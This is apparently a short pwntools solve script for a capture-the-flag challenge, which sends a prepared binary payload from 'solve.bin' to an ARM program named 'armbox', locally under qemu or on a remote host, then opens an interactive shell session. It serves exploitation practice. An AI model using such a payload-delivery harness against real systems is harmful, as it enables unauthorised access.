from pwn import *

if args.HOST and args.PORT:
    p = remote(args.HOST, args.PORT)
else:
    p = process(["../qemu-arm", "./armbox"])

program = open("solve.bin", "rb").read()
program = program.ljust(0x10000, b"\x00")

p.sendlineafter(b"program: ", program)

p.interactive()